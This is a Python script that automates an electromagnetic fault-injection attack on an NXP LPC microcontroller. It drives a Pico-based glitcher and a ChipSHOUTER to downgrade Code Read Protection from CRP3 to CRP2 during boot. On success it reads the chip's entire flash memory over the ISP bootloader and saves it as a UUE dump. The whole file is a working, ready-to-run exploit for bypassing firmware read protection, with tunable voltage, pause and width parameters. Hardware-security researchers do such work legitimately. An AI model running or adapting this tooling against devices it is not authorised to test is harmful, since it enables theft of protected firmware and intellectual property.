#!/usr/bin/env python3
"""
CRP3 to CRP2 Downgrade Glitch Attack

Uses GPIO RESET trigger to glitch during boot and downgrades CRP3 to CRP2.
Success is determined by bootloader SYNC working (bootloader becomes active in CRP2).
"""

import serial
import time
import csv
from datetime import datetime
import sys

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200
TIMEOUT = 2.0

def send_command(ser, cmd):
    """Send command in API mode and check response"""
    # Clear any pending data
    ser.read(ser.in_waiting)

    # Send command
    ser.write(f"{cmd}\r\n".encode())

    # Wait for '.' (command received)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '.':
                break

    # Wait for '+' (success) or '!' (failure)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '+':
                return True
            elif char == '!':
                return False

    return False

def send_command_get_data(ser, cmd, timeout=1.0):
    """Send command in API mode and return response data"""
    # Clear any pending data
    ser.read(ser.in_waiting)

    # Send command
    ser.write(f"{cmd}\r\n".encode())

    # Wait for '.' (command received)
    start = time.time()
    while time.time() - start < timeout:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '.':
                break
        time.sleep(0.01)

    # Wait for '+' (success) or '!' (failure)
    start = time.time()
    while time.time() - start < timeout:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '+':
                # Success! Now read the actual data
                time.sleep(0.1)  # Give it time to send data
                if ser.in_waiting > 0:
                    return ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                return ""
            elif char == '!':
                return None
        time.sleep(0.01)

    return None

def check_cs_armed(ser):
    """Check if ChipSHOUTER is armed by querying status"""
    # Clear any pending data
    ser.read(ser.in_waiting)

    # Send CS STATUS command
    ser.write(b"CS STATUS\r\n")

    # Wait for '.' (command received)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '.':
                break

    # Wait for '+' or '!' and collect full response
    response = ""
    start = time.time()
    got_response = False
    while time.time() - start < 3.0:  # Longer timeout for status query
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            if '+' in response or '!' in response:
                got_response = True
                # Give it a bit more time to collect full response
                time.sleep(0.1)
                if ser.in_waiting > 0:
                    response += ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                break

    if not got_response:
        return False

    # Check if "armed" appears in the status (ChipSHOUTER reports "armed" in status)
    # The response format includes "# armed:" or "state armed" when armed
    return "armed" in response.lower() and "disarmed" not in response.lower()

def wait_for_cs_armed(ser, timeout=5.0):
    """Poll CS STATUS until ChipSHOUTER reports armed or timeout"""
    start = time.time()
    while time.time() - start < timeout:
        if check_cs_armed(ser):
            return True
        time.sleep(0.1)  # Brief delay between polls
    return False

def wait_for_response(ser, expected_text, timeout=5.0):
    """Wait for specific text in serial response"""
    start_time = time.time()
    full_response = ""
    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if expected_text in full_response:
                return True, full_response
        time.sleep(0.01)
    return False, full_response

def setup_gpio_trigger(ser, voltage, pause, width):
    """Configure GPIO trigger and glitch parameters"""
    # Set ChipSHOUTER voltage
    send_command(ser, f"CS VOLTAGE {voltage}")

    # Set glitch timing parameters
    send_command(ser, f"SET PAUSE {pause}")
    send_command(ser, f"SET WIDTH {width}")
    send_command(ser, f"SET COUNT 1")

    # Configure GPIO trigger on GP3, rising edge (triggered by GP15 RESET)
    send_command(ser, "TRIGGER GPIO RISING")

def read_flash_memory(ser, address, num_bytes, output_file):
    """
    Read flash memory from target using LPC ISP R command and save as UUE file

    Implements LPC ISP continuation protocol:
    - Send R command
    - Receive return code (0)
    - Receive up to 20 UUencode lines
    - Receive checksum
    - Send "OK" to continue
    - Repeat until all data received

    Args:
        ser: Serial port object
        address: Start address to read from
        num_bytes: Number of bytes to read
        output_file: Path to output .uue file

    Returns:
        bool: True if read successful, False otherwise
    """
    print(f"Reading {num_bytes} bytes from address 0x{address:08X}...", flush=True)

    # Disable API mode temporarily for faster flash reading
    ser.write(b"API OFF\r\n")
    time.sleep(0.2)
    ser.read(ser.in_waiting)

    # Set TARGET TIMEOUT to 10ms for fast operation (500x speed improvement)
    ser.write(b"TARGET TIMEOUT 10\r\n")
    time.sleep(0.1)
    while ser.read(1) != b'>':  # Wait for prompt
        pass
    ser.read(ser.in_waiting)

    # Send R command via Raiden Pico TARGET SEND
    # LPC ISP R command format: R <address> <num_bytes>
    cmd = f"R {address} {num_bytes}"
    print(f"Sending command: {cmd}", flush=True)

    # Send command in non-API mode
    ser.write(f'TARGET SEND "{cmd}"\r\n'.encode())

    # Helper function to read lines
    def read_line():
        """Read a single line from serial"""
        while True:
            line = ser.read_until(b'\r').decode('utf-8', errors='ignore').strip()
            if line:  # Skip empty lines
                return line
            if not ser.in_waiting:  # No more data
                return None

    # Helper function to calculate UUE checksum
    def calculate_uue_checksum(lines):
        """Calculate checksum for UUE lines (sum of all decoded bytes)"""
        total = 0
        for line in lines:
            # Decode UUE line
            length = ord(line[0]) - 32
            for i in range(0, length, 3):
                chunk = line[1 + (i // 3) * 4 : 1 + (i // 3) * 4 + 4]
                if len(chunk) == 4:
                    # Decode 4 UUE chars to 3 bytes
                    b1 = (ord(chunk[0]) - 32) << 2 | (ord(chunk[1]) - 32) >> 4
                    b2 = ((ord(chunk[1]) - 32) & 0xF) << 4 | (ord(chunk[2]) - 32) >> 2
                    b3 = ((ord(chunk[2]) - 32) & 0x3) << 6 | (ord(chunk[3]) - 32)
                    if i < length:
                        total += b1
                    if i + 1 < length:
                        total += b2
                    if i + 2 < length:
                        total += b3
        return total & 0xFFFFFFFF

    # Calculate expected number of UUE lines
    expected_lines = (num_bytes + 44) // 45
    print(f"Expecting {expected_lines} UUE lines", flush=True)

    # Read firmware echo
    read_line()
    # Read target echo
    target_echo = read_line()
    # Read error code
    error_line = read_line()

    if not error_line or not error_line[0].isdigit():
        print(f"ERROR: Expected error code, got: {repr(error_line)}", flush=True)
        # Re-enable API mode before returning
        ser.write(b"API ON\r\n")
        time.sleep(0.2)
        return False

    error_code = error_line[0]
    if error_code != '0':
        print(f"ERROR: Command failed with error code {error_code}", flush=True)
        # Re-enable API mode before returning
        ser.write(b"API ON\r\n")
        time.sleep(0.2)
        return False

    print(f"✓ Error code: {error_code}", flush=True)

    # Step 2: Read UUE data following continuation protocol
    uuencoded_lines = []
    lines_remaining = expected_lines
    first_chunk = True

    while lines_remaining > 0:
        chunk_size = min(20, lines_remaining)
        chunk_lines = []

        # If this is a continuation (not the first chunk), we need to read echo responses first
        if not first_chunk:
            # Read firmware echo
            read_line()
            # Read Pico prompt
            read_line()
            # Read target echo ("OK")
            read_line()

        first_chunk = False

        # Read chunk_size UUE lines
        for i in range(chunk_size):
            line = read_line()
            if not line:
                print(f"ERROR: Timeout reading line {len(uuencoded_lines) + i + 1}/{expected_lines}", flush=True)
                # Re-enable API mode before returning
                ser.write(b"API ON\r\n")
                time.sleep(0.2)
                return False

            # Verify it's a UUE line
            if line[0] not in ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLM':
                print(f"ERROR: Invalid UUE line at {len(uuencoded_lines) + i + 1}: {repr(line)}", flush=True)
                # Re-enable API mode before returning
                ser.write(b"API ON\r\n")
                time.sleep(0.2)
                return False

            chunk_lines.append(line)

        # Read checksum
        checksum_line = read_line()

        if not checksum_line or not checksum_line.isdigit():
            print(f"ERROR: Expected checksum after line {len(uuencoded_lines) + chunk_size}, got: {repr(checksum_line)}", flush=True)
            # Re-enable API mode before returning
            ser.write(b"API ON\r\n")
            time.sleep(0.2)
            return False

        received_checksum = int(checksum_line)

        # Calculate expected checksum for this chunk
        # Replace backticks with spaces before calculating (LPC uses backticks for spaces)
        chunk_lines_fixed = [line.replace('`', ' ') for line in chunk_lines]
        calculated_checksum = calculate_uue_checksum(chunk_lines_fixed)

        # Verify checksum
        if received_checksum != calculated_checksum:
            print(f"ERROR: Checksum mismatch at line {len(uuencoded_lines)}!", flush=True)
            print(f"  Expected: {calculated_checksum}", flush=True)
            print(f"  Received: {received_checksum}", flush=True)
            # Re-enable API mode before returning
            ser.write(b"API ON\r\n")
            time.sleep(0.2)
            return False

        # Consume the \n after checksum if present
        if ser.in_waiting > 0:
            ser.read(1)

        uuencoded_lines.extend(chunk_lines)
        lines_remaining -= chunk_size

        # Progress update every 100 lines
        if len(uuencoded_lines) % 100 == 0 or lines_remaining == 0:
            print(f"  Progress: {len(uuencoded_lines)}/{expected_lines} lines ({len(uuencoded_lines) * 45} bytes)", flush=True)

        # If more lines to read, send OK to continue
        if lines_remaining > 0:
            ser.write(b'TARGET SEND "OK"\r\n')

    # Read end marker (backtick character - LPC uses backtick for space)
    # In non-API mode, we may get '>' prompt directly instead
    end_marker = read_line()
    if end_marker not in ('`', '>'):
        print(f"WARNING: Unexpected end marker: {repr(end_marker)}", flush=True)

    print(f"\n✓ Successfully read {len(uuencoded_lines)} UUE lines", flush=True)

    # Re-enable API mode
    ser.write(b"API ON\r\n")
    time.sleep(0.2)
    ser.read(ser.in_waiting)

    # Write to .uue file with proper structure
    # Derive binary filename from UUE filename (replace .uue with .bin)
    import os
    base_name = os.path.splitext(os.path.basename(output_file))[0]
    bin_filename = f"{base_name}.bin"

    with open(output_file, 'w') as f:
        # UUE header: begin <mode> <filename>
        f.write(f"begin 644 {bin_filename}\n")

        # Write UUencoded lines (replace backticks with spaces - LPC ISP uses backticks for spaces)
        for line in uuencoded_lines:
            fixed_line = line.replace('`', ' ')
            f.write(fixed_line + '\n')

        # UUE footer: empty line (space, not backtick) and "end"
        f.write(" \n")
        f.write("end\n")

    print(f"✓ Flash memory saved to: {output_file}", flush=True)
    return True

def test_crp3_to_crp2_glitch(ser, voltage, pause, width):
    """
    Perform single CRP3→CRP2 glitch attempt

    Returns:
        tuple: (result, response_snippet, uue_file)
        result: "SUCCESS" | "FAIL" | "ERROR"
        response_snippet: First 100 chars of response for debugging
        uue_file: Path to saved .uue file if successful, None otherwise
    """
    # Arm the glitch trigger BEFORE TARGET SYNC
    # TARGET SYNC will reset the target internally, triggering the GPIO glitch
    send_command(ser, "ARM ON")

    # Try to SYNC with bootloader
    # TARGET SYNC command internally does:
    # 1. Resets target via TARGET RESET
    # 2. GP15 goes HIGH (triggers GP3 via GPIO trigger)
    # 3. Glitch fires during boot
    # 4. Attempts bootloader SYNC
    #
    # In CRP3: bootloader is disabled, SYNC will timeout/fail
    # In CRP2: bootloader is active, SYNC will succeed
    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=15.0)

    # Return response snippet for logging
    response_snippet = response[:150] if response else ""

    if success:
        # Bootloader is now accessible! Read flash memory
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        uue_file = f"crp3_flash_dump_{timestamp}.uue"

        print(f"\n✓✓✓ CRP3→CRP2 SUCCESS! Bootloader active!", flush=True)
        print(f"Reading flash memory...", flush=True)

        # Read full flash memory from address 0
        # Total size: 516096 bytes (504 KB)
        if read_flash_memory(ser, 0, 516096, uue_file):
            return "SUCCESS", response_snippet, uue_file
        else:
            print("WARNING: Flash read failed, but glitch was successful", flush=True)
            return "SUCCESS", response_snippet, None
    elif "sync failed" in response.lower() or "no response from target" in response.lower() or "timeout" in response.lower():
        return "FAIL", response_snippet, None
    else:
        return "ERROR", response_snippet, None

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 crp3_to_crp2_glitch.py <voltage> <pause> <width> <iterations>")
        print("Example: python3 crp3_to_crp2_glitch.py 290 0 150 1000")
        print()
        print("Parameters:")
        print("  voltage    - ChipSHOUTER voltage (e.g., 290)")
        print("  pause      - PIO cycles before glitch (e.g., 0)")
        print("  width      - Glitch pulse width in PIO cycles (e.g., 150)")
        print("  iterations - Number of attempts (e.g., 1000)")
        sys.exit(1)

    voltage = int(sys.argv[1])
    pause = int(sys.argv[2])
    width = int(sys.argv[3])
    iterations = int(sys.argv[4])

    print("=" * 70)
    print("CRP3 → CRP2 DOWNGRADE GLITCH ATTACK")
    print("=" * 70)
    print(f"Voltage: {voltage}V")
    print(f"Pause: {pause} cycles")
    print(f"Width: {width} cycles")
    print(f"Iterations: {iterations}")
    print(f"Trigger: GPIO RESET (GP15 → GP3)")
    print("=" * 70)
    print()

    # Create CSV log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"crp3_to_crp2_V{voltage}_P{pause}_W{width}_{iterations}x_{timestamp}.csv"

    # Connect to Raiden Pico
    print(f"Connecting to {SERIAL_PORT}...")
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
    time.sleep(0.5)

    try:
        # Enable API mode
        print("Enabling API mode...")
        ser.write(b"API ON\r\n")
        time.sleep(0.2)
        ser.read(ser.in_waiting)  # Clear response
        print("✓ API mode enabled\n")

        # Initial setup
        print("Setting up system...")
        send_command(ser, "TARGET LPC")
        setup_gpio_trigger(ser, voltage, pause, width)

        # ChipSHOUTER setup
        send_command(ser, "CS TRIGGER HARDWARE HIGH")
        send_command(ser, "CS ARM")

        # Poll status until ChipSHOUTER is armed
        print("Waiting for ChipSHOUTER to arm...")
        if wait_for_cs_armed(ser, timeout=5.0):
            print("✓ ChipSHOUTER armed and ready")
        else:
            print("WARNING: ChipSHOUTER may not be armed (timeout)")

        print("Setup complete\n")

        # Counters
        success_count = 0
        fail_count = 0
        error_count = 0

        start_time = time.time()
        last_print_time = start_time

        with open(csv_file, 'w', newline='', buffering=1) as f:
            writer = csv.writer(f)
            writer.writerow(['iteration', 'timestamp', 'voltage', 'pause', 'width', 'result', 'elapsed_time', 'uue_file', 'response'])

            for i in range(iterations):
                test_start = time.time()

                result, response, uue_file = test_crp3_to_crp2_glitch(ser, voltage, pause, width)

                test_elapsed = time.time() - test_start

                # Log to CSV
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                uue_file_str = uue_file if uue_file else ""
                writer.writerow([i+1, ts, voltage, pause, width, result, f"{test_elapsed:.2f}", uue_file_str, response])
                f.flush()

                # Update counters
                if result == "SUCCESS":
                    success_count += 1
                    print(f"\n[{i+1}/{iterations}] ✓✓✓ CRP3→CRP2 SUCCESS! ✓✓✓", flush=True)
                    print(f"  Bootloader now active! Parameters: V={voltage} P={pause} W={width}", flush=True)
                    if uue_file:
                        print(f"  Flash dump saved to: {uue_file}", flush=True)
                    # Stop after first successful flash extraction
                    print("\n✓ Flash memory successfully extracted! Stopping test.", flush=True)
                    break
                elif result == "FAIL":
                    fail_count += 1
                elif result == "ERROR":
                    error_count += 1
                    print(f"\n[{i+1}/{iterations}] ? ERROR: {response[:50]}", flush=True)

                # Print progress every 30 seconds
                current_time = time.time()
                if current_time - last_print_time >= 30:
                    elapsed = current_time - start_time
                    remaining = (elapsed / (i + 1)) * (iterations - (i + 1))
                    tests_per_sec = (i + 1) / elapsed

                    print(f"\n[{i+1}/{iterations}] Progress: {(i+1)/iterations*100:.1f}%", flush=True)
                    print(f"  SUCCESS: {success_count} ({success_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  FAIL: {fail_count} ({fail_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  ERROR: {error_count} ({error_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Speed: {tests_per_sec:.2f} tests/sec", flush=True)
                    print(f"  Remaining: {remaining/60:.1f} minutes\n", flush=True)

                    last_print_time = current_time

                # If we found a success, ask if user wants to continue
                if success_count > 0 and (i+1) % 10 == 0:
                    print(f"\n✓ Found {success_count} successful CRP3→CRP2 downgrade(s) so far!", flush=True)

        # Final summary
        elapsed = time.time() - start_time
        print("\n" + "=" * 70)
        print("TEST COMPLETE")
        print("=" * 70)
        print(f"Duration: {elapsed/60:.1f} minutes ({elapsed/3600:.2f} hours)")
        print(f"Total tests: {iterations}")
        print(f"Tests/second: {iterations/elapsed:.2f}")
        print()
        print("Results:")
        print(f"  SUCCESS (CRP3→CRP2): {success_count:5d} ({success_count/iterations*100:6.2f}%)")
        print(f"  FAIL (still CRP3):   {fail_count:5d} ({fail_count/iterations*100:6.2f}%)")
        print(f"  ERROR:               {error_count:5d} ({error_count/iterations*100:6.2f}%)")
        print()
        print(f"Results saved to: {csv_file}")
        print("=" * 70)

        if success_count > 0:
            print()
            print("✓✓✓ CRP3→CRP2 DOWNGRADE SUCCESSFUL! ✓✓✓")
            print(f"Parameters: Voltage={voltage}V, Pause={pause}, Width={width}")
            print("Target bootloader is now accessible in CRP2 mode!")

    finally:
        # Disable API mode
        ser.write(b"API OFF\r\n")
        time.sleep(0.2)
        ser.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
